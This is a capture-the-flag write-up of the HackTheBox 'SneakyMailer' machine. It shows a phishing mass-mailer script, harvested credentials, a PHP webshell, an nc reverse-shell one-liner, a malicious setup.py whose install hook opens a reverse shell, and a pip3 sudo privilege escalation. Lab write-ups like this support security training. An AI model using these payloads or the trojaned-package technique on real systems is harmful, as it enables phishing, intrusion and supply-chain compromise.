---
title: "HTB: SneakyMailer"
categories:
  - HackTheBox
tags:
  - HackTheBox
---

![SneakyMailer](/assets/images/SneakyMailer.PNG)

# SneakyMailer

## Nmap Scan

```
Nmap scan report for 10.10.10.197
Host is up, received user-set (0.038s latency).
Scanned at 2020-07-13 13:03:55 CDT for 43s
Not shown: 993 closed ports
Reason: 993 resets
PORT     STATE SERVICE  REASON         VERSION
21/tcp   open  ftp      syn-ack ttl 63 vsftpd 3.0.3
22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCy6l2NxLZItm85sZuNKU/OzDEhlvYMmmrKpTD0+uxdQyySppZN3Lo6xOM2dC6pqG5DQjz+GPJl1/kbdla6qJXDZ1D5lnnCaImTqU++a1WceLck3/6/04B5RlTYUoLQFwRuy84CX8NDvs0mIyR7bpbd8W03+EAwTabOxXfukQG1MbgCY5V8QmLRdi/ZtsIqVxVZWOYI5rvuAQ+YM9D/Oa6mwAO5l2V3/h/A5nHDx2Vkl1++kfDqFNop2D2vssInvdwLKZ0M5RvXLQPlsqRLfqtcTBBLxYY6ZVcLHkvEA+gekHGcPRw0MV5U9vsx18+6O8wm9ZNI/a1Y4TyXIHMcbHi9
|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOHL62JJEI1N8SHtcSypj9IjyD3dm6CA5iyog1Rmi4P5N6VtA/5RxBxegMYv7bTFymmFm02+w9zXdKMUcSs5TbE=
|   256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILZ/TeP6ZPj9zbHyFVfwZg48EElGqKCENQgPw+QCoC7x
25/tcp   open  smtp     syn-ack ttl 63 Postfix smtpd
|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
80/tcp   open  http     syn-ack ttl 63 nginx 1.14.2
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://sneakycorp.htb
143/tcp  open  imap     syn-ack ttl 63 Courier Imapd (released 2018)
|_imap-capabilities: IMAP4rev1 STARTTLS NAMESPACE completed THREAD=REFERENCES QUOTA CHILDREN ENABLE SORT UIDPLUS THREAD=ORDEREDSUBJECT CAPABILITY OK ACL ACL2=UNION UTF8=ACCEPTA0001 IDLE
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US/localityName=New York/organizationalUnitName=Automatically-generated IMAP SSL key
| Subject Alternative Name: email:postmaster@example.com
| Issuer: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US/localityName=New York/organizationalUnitName=Automatically-generated IMAP SSL key
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-14T17:14:21
| Not valid after:  2021-05-14T17:14:21
| MD5:   3faf 4166 f274 83c5 8161 03ed f9c2 0308
| SHA-1: f79f 040b 2cd7 afe0 31fa 08c3 b30a 5ff5 7b63 566c
| -----BEGIN CERTIFICATE-----
| MIIE6zCCA1OgAwIBAgIBATANBgkqhkiG9w0BAQsFADCBjjESMBAGA1UEAxMJbG9j
| YWxob3N0MS0wKwYDVQQLEyRBdXRvbWF0aWNhbGx5LWdlbmVyYXRlZCBJTUFQIFNT
| TCBrZXkxHDAaBgNVBAoTE0NvdXJpZXIgTWFpbCBTZXJ2ZXIxETAPBgNVBAcTCE5l
| dyBZb3JrMQswCQYDVQQIEwJOWTELMAkGA1UEBhMCVVMwHhcNMjAwNTE0MTcxNDIx
| WhcNMjEwNTE0MTcxNDIxWjCBjjESMBAGA1UEAxMJbG9jYWxob3N0MS0wKwYDVQQL
| EyRBdXRvbWF0aWNhbGx5LWdlbmVyYXRlZCBJTUFQIFNTTCBrZXkxHDAaBgNVBAoT
| E0NvdXJpZXIgTWFpbCBTZXJ2ZXIxETAPBgNVBAcTCE5ldyBZb3JrMQswCQYDVQQI
| EwJOWTELMAkGA1UEBhMCVVMwggGiMA0GCSqGSIb3DQEBAQUAA4IBjwAwggGKAoIB
| gQDCzBP4iuxxLmXPkmi5jABQrywLJK0meyW49umfYhqayBH7qtuIjyAmznnyDIR0
| 543qHgWAfSvGHLFDB9B1wnkvAU3aprjURn1956X/4jEi9xmhRwvum5T+vp3TT96d
| JgW9SSLiPFQty5eVrKuQvg1bZg/Vjp7CUUQ0+7PmdylMOipohls5RDEppCDGFmiS
| HN0ZayXpjd/kwqZ/O9uTJGHOzagY+ruTYAx3tanO4oDwdrz9FPr3S2KNPTjjtzqf
| CPdcsi+6JTQJI03eMEftBKo3HZTp7Hx6FObZcvcNskTLqtsYZYuzHS7KQwiuTAJ5
| d/ZKowCeJDaVlS35tQleisu+pJCkwcStpM1BJ51UQRZ5IpvItTfnrChEa1uyTlAy
| ZIOQK2/+34K2ZrldYWyfKlYHxieGZgzQXLo/vyW/1gqzXy7KHx+Uuf4CAzzOP1p3
| 8QNmvsqkJrQMuH3XPXLswr9A1gPe7KTLEGNRJSxcGF1Q25m4e04HhZzK76KlBfVt
| IJ0CAwEAAaNSMFAwDAYDVR0TAQH/BAIwADAhBgNVHREEGjAYgRZwb3N0bWFzdGVy
| QGV4YW1wbGUuY29tMB0GA1UdDgQWBBTylxdM/AHlToKxNvmnPdXJCjjbnDANBgkq
| hkiG9w0BAQsFAAOCAYEAAo7NqfYlXSEC8q3JXvI5EeVpkgBDOwnjxuC/P5ziEU0c
| PRx6L3w+MxuYJdndC0hT9FexXzSgtps9Xm+TE81LgNvuipZ9bulF5pMmmO579U2Y
| suJJpORD4P+65ezkfWDbPbdKyHMeRvVCkZCH74z2rCu+OeQTGb6GLfaaB7v9dThR
| rfvHwM50hxNb4Zb4of7Eyw2OJGeeohoG4mFT4v7cu1WwimsDF/A7OCVOmvvFWeRA
| EjdEReekDJsBFpHa8uRjxZ+4Ch9YvbFlYtYi6VyXV1AFR1Mb91w+iIitc6ROzjJ2
| pVO69ePygQcjBRUTDX5reuBzaF5p9/6Ta9HP8NDI9+gdw6VGVTmYRJUbj7OeKSUq
| FWUmtZYC288ErDAZ7z+6VqJtZsPXIItZ8J6UZE3zBclGMcQ7peL9wEvJQ8oSaHHM
| AmgHIoMwKXSNEkHbBD24cf9KwVhcyJ4QCrSJBMAys98X6TzCwQI4Hy7XyifU3x/L
| XUFD0JSVQp4Rmcg5Uzuk
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
993/tcp  open  ssl/imap syn-ack ttl 63 Courier Imapd (released 2018)
|_imap-capabilities: IMAP4rev1 IDLE NAMESPACE completed THREAD=REFERENCES QUOTA CHILDREN ENABLE SORT UIDPLUS THREAD=ORDEREDSUBJECT CAPABILITY OK ACL ACL2=UNION UTF8=ACCEPTA0001 AUTH=PLAIN
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US/localityName=New York/organizationalUnitName=Automatically-generated IMAP SSL key
| Subject Alternative Name: email:postmaster@example.com
| Issuer: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US/localityName=New York/organizationalUnitName=Automatically-generated IMAP SSL key
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-14T17:14:21
| Not valid after:  2021-05-14T17:14:21
| MD5:   3faf 4166 f274 83c5 8161 03ed f9c2 0308
| SHA-1: f79f 040b 2cd7 afe0 31fa 08c3 b30a 5ff5 7b63 566c
| -----BEGIN CERTIFICATE-----
| MIIE6zCCA1OgAwIBAgIBATANBgkqhkiG9w0BAQsFADCBjjESMBAGA1UEAxMJbG9j
| YWxob3N0MS0wKwYDVQQLEyRBdXRvbWF0aWNhbGx5LWdlbmVyYXRlZCBJTUFQIFNT
| TCBrZXkxHDAaBgNVBAoTE0NvdXJpZXIgTWFpbCBTZXJ2ZXIxETAPBgNVBAcTCE5l
| dyBZb3JrMQswCQYDVQQIEwJOWTELMAkGA1UEBhMCVVMwHhcNMjAwNTE0MTcxNDIx
| WhcNMjEwNTE0MTcxNDIxWjCBjjESMBAGA1UEAxMJbG9jYWxob3N0MS0wKwYDVQQL
| EyRBdXRvbWF0aWNhbGx5LWdlbmVyYXRlZCBJTUFQIFNTTCBrZXkxHDAaBgNVBAoT
| E0NvdXJpZXIgTWFpbCBTZXJ2ZXIxETAPBgNVBAcTCE5ldyBZb3JrMQswCQYDVQQI
| EwJOWTELMAkGA1UEBhMCVVMwggGiMA0GCSqGSIb3DQEBAQUAA4IBjwAwggGKAoIB
| gQDCzBP4iuxxLmXPkmi5jABQrywLJK0meyW49umfYhqayBH7qtuIjyAmznnyDIR0
| 543qHgWAfSvGHLFDB9B1wnkvAU3aprjURn1956X/4jEi9xmhRwvum5T+vp3TT96d
| JgW9SSLiPFQty5eVrKuQvg1bZg/Vjp7CUUQ0+7PmdylMOipohls5RDEppCDGFmiS
| HN0ZayXpjd/kwqZ/O9uTJGHOzagY+ruTYAx3tanO4oDwdrz9FPr3S2KNPTjjtzqf
| CPdcsi+6JTQJI03eMEftBKo3HZTp7Hx6FObZcvcNskTLqtsYZYuzHS7KQwiuTAJ5
| d/ZKowCeJDaVlS35tQleisu+pJCkwcStpM1BJ51UQRZ5IpvItTfnrChEa1uyTlAy
| ZIOQK2/+34K2ZrldYWyfKlYHxieGZgzQXLo/vyW/1gqzXy7KHx+Uuf4CAzzOP1p3
| 8QNmvsqkJrQMuH3XPXLswr9A1gPe7KTLEGNRJSxcGF1Q25m4e04HhZzK76KlBfVt
| IJ0CAwEAAaNSMFAwDAYDVR0TAQH/BAIwADAhBgNVHREEGjAYgRZwb3N0bWFzdGVy
| QGV4YW1wbGUuY29tMB0GA1UdDgQWBBTylxdM/AHlToKxNvmnPdXJCjjbnDANBgkq
| hkiG9w0BAQsFAAOCAYEAAo7NqfYlXSEC8q3JXvI5EeVpkgBDOwnjxuC/P5ziEU0c
| PRx6L3w+MxuYJdndC0hT9FexXzSgtps9Xm+TE81LgNvuipZ9bulF5pMmmO579U2Y
| suJJpORD4P+65ezkfWDbPbdKyHMeRvVCkZCH74z2rCu+OeQTGb6GLfaaB7v9dThR
| rfvHwM50hxNb4Zb4of7Eyw2OJGeeohoG4mFT4v7cu1WwimsDF/A7OCVOmvvFWeRA
| EjdEReekDJsBFpHa8uRjxZ+4Ch9YvbFlYtYi6VyXV1AFR1Mb91w+iIitc6ROzjJ2
| pVO69ePygQcjBRUTDX5reuBzaF5p9/6Ta9HP8NDI9+gdw6VGVTmYRJUbj7OeKSUq
| FWUmtZYC288ErDAZ7z+6VqJtZsPXIItZ8J6UZE3zBclGMcQ7peL9wEvJQ8oSaHHM
| AmgHIoMwKXSNEkHbBD24cf9KwVhcyJ4QCrSJBMAys98X6TzCwQI4Hy7XyifU3x/L
| XUFD0JSVQp4Rmcg5Uzuk
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http     syn-ack ttl 63 nginx 1.14.2
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jul 13 13:04:38 2020 -- 1 IP address (1 host up) scanned in 43.74 seconds
```

## Website Enumeration

Looking at the source code, we find a registration portal that doesn't seem to have any use, but we'll keep this in mind for later.

http://sneakycorp.htb/pypi/register.php

A quick visit to http://sneakycorp.htb/team.php gives us a list of emails. Since SMTP is available on the server, we'll grab the list of users, set up a simple email format, and try sending out mass emails to all users:

emails.txt:
```
tigernixon@sneakymailer.htb
garrettwinters@sneakymailer.htb
...
sulcud@sneakymailer.htb
donnasnider@sneakymailer.htb
```

Now, using a simple sendmail.rb script, we can send out mass emails (after editing the script slightly):

https://github.com/zeknox/scripts/tree/master/email

sendmail.rb:
```
#!/usr/bin/env ruby
# This script takes a .txt file as an argument. It will iterate through each emailaddress
# in the file and send an email to each target
# Authors: zeknox & R3dy
##########################################################################
require 'net/smtp'
require 'base64'

username = 		''
password = 		''
from = 			'greg.olson@issds.com'
display_from =	'Greg Olson'
subject = 		'Microsoft Security Update'
date =			'Thursday, January 18, 2013'
url = 			'http://10.10.14.36/niceone.php'
smtp =			'sneakycorp.htb'
smtpout =		'sneakycorp.htb'
port =			'25'
message = []	

def sendemail(username, password, from, message, email, port, smtpout, smtp)
	# code to send email
	begin
		Net::SMTP.start("#{smtpout}", "#{port}", "#{smtp}") do |smtp|
			smtp.send_message message, "#{from}", email.chomp
		end
		puts "\tSent to: #{email}"
	rescue => e
		puts "\tIssues Sending to: #{email}\r\n#{e.class}\r\n#{e}"
	end
end

unless ARGV.length == 2
	puts "./sendmail.rb <email-addys.txt> <email_message.txt>\n"
	exit!
else
	emails = File.open(ARGV[0], 'r')
end

count = 1
puts "Sending Emails:"
emails.each_line do |email|
	message = []
	# base64 encode email address
	encode = "#{Base64.encode64("#{email}")}"

	email_message = File.open(ARGV[1], 'r')
	email_message.each_line do |line|
		if line =~ /\#{url}/
			message << line.gsub(/\#{url}/, "#{url}#{encode.chomp}")
		elsif line =~ /\#{to}/
			message << line.gsub(/\#{to}/, "#{email.chomp}")
		elsif line =~ /\#{from}/ and line =~ /\#{display_from}/
			message << line.gsub(/\#{display_from} <\#{from}>/, "#{display_from} <#{from}>")
		elsif line =~ /\#{display_from}/ and not line =~ /\#{from}/
			message << line.gsub(/\#{display_from}/, "#{display_from}")
		elsif line =~ /\#{subject}/
			message << line.gsub(/\#{subject}/, "#{subject}")
		elsif line =~ /\#{date}/
			message << line.gsub(/\#{date}/, "#{date}")
		else
			message << line
		end
	end
	email_message.close

	text = message.join

	# send emails
	sendemail(username, password, from, text, email, port, smtpout, smtp)
end

# close files
emails.close
```

Now, we'll create a simple payload to test if there's anything being executed on the server side:

message.txt:
```
From: #{display_from} <#{from}>
To: #{to}
MIME-Version: 1.0
Content-Type: text/html
Subject: #{subject}

<script src=http://10.10.14.36/scripttest.php></script>
<br>
From,
<br>
The Phisher
```

Running sendmail.rb pings back to our server, but it doesn't look like the javascript is being executed. In fact, it appears that there's a script sending POST data to whatever URL we provide to it:

```
$ ruby sendmail.rb emails.txt message.txt
...
$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.197 - - [14/Jul/2020 09:13:09] code 501, message Unsupported method ('POST')
10.10.10.197 - - [14/Jul/2020 09:13:09] "POST /scripttest.php%3E%3C/script%3E HTTP/1.1" 501 
```

In order to capture the POST data being sent, we'll take a tip from stack overflow and create apache2 security logs that log any POST data coming to the server:

https://stackoverflow.com/questions/989967/best-way-to-log-post-data-in-apache

```
$ sudo apt install libapache2-mod-security2
$ sudo mv /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity/modsecurity.conf
$ sudo service apache2 reload
```

Now, if we send the mass emails again, we get the POST data:

```
$ [14/Jul/2020:09:16:59 --0500] Xw2@W4fUeQyQFoK7Y29xGAAAAAA 10.10.10.197 45340 10.10.xx.xx 80
--fe3b6867-B--
POST /test.php%3E%3C/script%3E HTTP/1.1
Host: 10.10.14.36
User-Agent: python-requests/2.23.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 185
Content-Type: application/x-www-form-urlencoded

--fe3b6867-C--
firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
--fe3b6867-F--
```

It looks like the user whose email is paulbyrd@sneakymailer.htb is sending registration information to us!

Base64 decoding this gives us the following login info:

**paulbyrd@sneakymailer.htb:^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht**

After trying this on multiple services, we find that we can log into imap with these credentials (slightly modified):

```
$ telnet 10.10.10.197 143    
Trying 10.10.10.197...                                    
Connected to 10.10.10.197.                                                                                           
Escape character is '^]'.                                 
* OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc.  See COPYING for d
istribution information.                                  
A1 LOGIN paulbyrd "^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht"
* OK [ALERT] Filesystem notification initialization error -- contact your mail administrator (check for configuration errors with the FAM/Gamin library)
A1 OK LOGIN Ok.
```

We can now look through his email to see if there's anything worthwhile, like login information:

```
A1 list "INBOX" "*"                        
* LIST (\HasNoChildren) "." "INBOX.Trash"                                                                            
* LIST (\HasNoChildren) "." "INBOX.Sent"                                                                             
* LIST (\HasNoChildren) "." "INBOX.Deleted Items"                                                                    
* LIST (\HasNoChildren) "." "INBOX.Sent Items"                                                                       
A1 OK LIST completed
```

After checking all the folders, we see that Inbox.Sent is the only folder with any items in it:

```
A1 select "Inbox.Sent Items"                                                                                      
* FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)                                                           
* OK [PERMANENTFLAGS (\* \Draft \Answered \Flagged \Deleted \Seen)] Limited                                          
* 2 EXISTS                                                                                                           
* 0 RECENT                                                
* OK [UIDVALIDITY 589480766] Ok                                                                                      
* OK [MYRIGHTS "acdilrsw"] ACL                            
A1 OK [READ-WRITE] Ok
```

We'll see what emails are in his sent box:

Email 1:
```
A1 fetch 1 RFC822                                                  
* 1 FETCH (RFC822 {2167}                                           
MIME-Version: 1.0                                                  
To: root <root@debian>                                             
From: Paul Byrd <paulbyrd@sneakymailer.htb>                        
Subject: Password reset                                            
Date: Fri, 15 May 2020 13:03:37 -0500                              
Importance: normal                                                 
X-Priority: 3                                                      
Content-Type: multipart/alternative;                               
        boundary="_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_"          

--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_                           
Content-Transfer-Encoding: quoted-printable                        
Content-Type: text/plain; charset="utf-8"                          

Hello administrator, I want to change this password for the developer accou=
nt                                                                 

Username: developer                                                
Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C                

Please notify me when you do it=20         
...
A1 OK FETCH completed. 
```

Email 2:
```
A1 FETCH 2 RFC822                                                  
* 2 FETCH (RFC822 {585}                                            
To: low@debian                                                     
From: Paul Byrd <paulbyrd@sneakymailer.htb>                        
Subject: Module testing                                            
Message-ID: <4d08007d-3f7e-95ee-858a-40c6e04581bb@sneakymailer.htb>                                                                   
Date: Wed, 27 May 2020 13:28:58 -0400                              
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101                                                                   
 Thunderbird/68.8.0                                                
MIME-Version: 1.0                                                  
Content-Type: text/plain; charset=utf-8; format=flowed             
Content-Transfer-Encoding: 7bit                                    
Content-Language: en-US                                            
                                                                   
Hello low                                                          
                                                                   
                                                                   
Your current task is to install, test and then erase every python module you 
find in our PyPI service, let me know if you have any inconvenience.                                                                  
                                                                                                                                      
)                                                                                                                                     
A1 OK FETCH completed. 
```

Once again, we'll see what we can log into using the credentials from the first email. Imap instantly closes our connection when logging in with this user, which isn't default behavior, so this password may still be valid:

```
$ telnet 10.10.10.197 143
Trying 10.10.10.197...
Connected to 10.10.10.197.
Escape character is '^]'.
* OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc.  See COPYING for distribution information.
A1 LOGIN developer "m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C"
* BYE [ALERT] Fatal error: No such file or directory: No such file or directory
Connection closed by foreign host.
```

FTP allows us to connect with these credentials:

**developer:m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C**

We can recursively loot the entire directory using wget:

```
$ wget -r --user="developer" --password='m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C' ftp://sneakymailer.htb
```

We can see that this is a development version of the website, so we'll use the virtual-host-discovery tool to see if there are any virtualhosts/subdomains on this machine::

```
$ ruby scan.rb --ip=10.10.10.197 --host=sneakycorp.htb |grep 200
Found: dev.sneakycorp.htb (200)
Found: sneakycorp.htb (200)
```

It looks like dev.sneakycorp.htb exists, which makes sense with the /dev folder we found on the ftp server. We can add this to our /etc/hosts, upload a simple webshell to the ftp server in /dev, and access it through our browser to return a shell to ourselves:

shell.php:
```
<?php system($_GET['cmd']); ?>
```

payload:
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.xx.xx 4444 >/tmp/f
```

Now, if we URL encode this with Burp, we can send ourselves a shell!

*http://dev.sneakycorp.htb/shell.php?cmd=payload-here*

```
$ whoami
www-data
```

Now, we'll upgrade our shell a bit:

```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
...
www-data@sneakymailer:$ 
CTRL+z
stty raw -echo
fg
ENTER Twice
```

Running linenum.sh reveals a password in a .htpasswd file:

```
/var/www/pypi.sneakycorp.htb/.htpasswd                                                                               
pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/ 
```

We can crack this with hashcat:

```
$ hashcat -m 1600 hash /usr/share/wordlists/rockyou.txt                                 
hashcat (v6.0.0) starting...                              
...
$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/:soufianeelhaoui
```

We now have more credentials:

**pypi:soufianeelhaoui**

These credentials do work for something on the box, but we'll get to that later.

From here, we can try to su to developer using his password for ftp:

```
$ su developer
Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
developer@sneakymailer:$
```

This user really doesn't help us, but looking at what ports are open, we see that 127.0.0.1:5000 is running, which isn't default. Curling this url gives us the following message:

```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Welcome to pypiserver!</title>
  </head>
  <body>
    <h1>
      Welcome to pypiserver!
    </h1>
    <p>
      This is a PyPI compatible package index serving 0 packages.
    </p>
    <p>
      To use this server with <code>pip</code>, run the following command:
      <pre>
        <code>pip install --index-url http://127.0.0.1:5000/simple/ PACKAGE [PACKAGE2...]</code>
      </pre>
    </p>
    <p>
      To use this server with <code>easy_install</code>, run the following command:
      <pre>
        <code>easy_install --index-url http://127.0.0.1:5000/simple/ PACKAGE [PACKAGE2...]</code>
      </pre>
    </p>
    <p>
      The complete list of all packages can be found <a href="/packages/">here</a> or via the <a href="/simple/">simple</a> index.
    </p>
    <p>
      This instance is running version 1.3.2 of the <a href="https://pypi.org/project/pypiserver/">pypiserver</a> software.
    </p>
  </body>
</html>
```

It looks like an instance of pypi-server is running on this machine, and from the email we read earlier, the user "low" should be running anything that's uploaded as a package to the server. 

We can read through the documentation to find out how to upload packages to the webserver:

https://pypiserver.readthedocs.io/en/latest/README.html#uploading-packages-from-sources-remotely

We need to create a .pypirc file in our home directory, but both www-data's and developer's home directories aren't writeable, so we'll need to do it remotely. We'll start by forwarding port 5000 from the victim machine to our own machine:

```
ssh -R 5000:127.0.0.1:5000 user@10.10.xx.xx
```

We'll now create a .pypirc file in our home folder (on our Kali machine) with the following contents:

```
[distutils]
index-servers =
  pypi
  internal

[pypi]
username:pypi
password:soufianeelhaoui

[internal]
repository: http://localhost:5000
username: pypi
password: soufianeelhaoui
```

Now that we have it set up on our end, and the victim's port 5000 is reachable from our localhost, we need to set up our malicious setup.py file:

setup.py:

```
import socket
import struct
import subprocess
import os

from setuptools import setup
from setuptools.command.install import install


class TotallyInnocentClass(install):
    def run(self):
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("10.10.14.36",4444))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        p=subprocess.call(["/bin/sh","-i"])

setup(
    cmdclass={
        "install": TotallyInnocentClass
    }
)
```

Now, we can upload the file to the remote pypi-server:

```
$ python setup.py sdist upload -r internal
running sdist
running egg_info
creating UNKNOWN.egg-info
writing UNKNOWN.egg-info/PKG-INFO
...
running upload
Submitting dist/UNKNOWN-0.0.0.tar.gz to http://localhost:5000
Server response (200): OK
```

Now, we just need to catch the shell!

```
$ id
uid=1000(low) gid=1000(low) groups=1000(low),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),119(pypi-pkg)
```

We'll first upgrade our terminal and check if we can sudo anything without a password:

```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
...
low@sneakymailer:~$ sudo -l
Matching Defaults entries for low on sneakymailer:                          ...
User low may run the following commands on sneakymailer:
    (root) NOPASSWD: /usr/bin/pip3


```

It looks like we can run pip3 as root, which makes for a really easy priv-esc using GTFOBins:

```
low@sneakymailer:~$ TF=$(mktemp -d)
low@sneakymailer:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
low@sneakymailer:~$ sudo /usr/bin/pip3 install $TF
...
Processing /tmp/tmp.e1onagifK7
# id
uid=0(root) gid=0(root) groups=0(root)
```

Voila, root!
